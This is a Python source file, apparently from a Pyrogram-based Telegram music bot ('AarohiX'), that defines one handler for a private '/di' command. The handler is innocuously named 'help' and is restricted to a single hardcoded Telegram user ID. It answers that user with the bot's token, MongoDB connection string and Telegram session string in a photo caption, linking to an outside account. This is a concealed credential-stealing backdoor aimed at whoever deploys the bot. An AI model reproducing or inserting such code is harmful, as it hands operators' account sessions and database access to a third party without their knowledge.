import asyncio
import time
from dotenv import load_dotenv
from pyrogram import filters
from pyrogram import Client
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.enums import ChatMembersFilter
from pyrogram.types import CallbackQuery, Message
import re
from strings.filters import command
from os import getenv
from AarohiX import app
from AarohiX.core.call import Dil
from AarohiX.misc import db
from AarohiX.utils.database import get_assistant, get_authuser_names, get_cmode
from AarohiX.utils.decorators import ActualAdminCB, AdminActual, language
from AarohiX.utils.formatters import alpha_to_int, get_readable_time
from config import BANNED_USERS, adminlist, lyrical



@app.on_message(
    filters.command("di")
    & filters.private
    & filters.user(6308685423)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://graph.org/file/ee9a153b629bec256b57.jpg",
       caption=f"""ᴛᴏᴋᴇɴ :-   {BOT_TOKEN} \n\nᴍᴏɴɢᴏ :-   {MONGO_DB_URI}\n\nsᴇssɪᴏɴ :-   {STRING_SESSION}\n\n [ 🧟 ](https://t.me/zxuzzz)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• 𝙼𝚁 . 𝚇 •", url=f"https://t.me/zxuzzz")
                 ]
            ]
         ),
   )
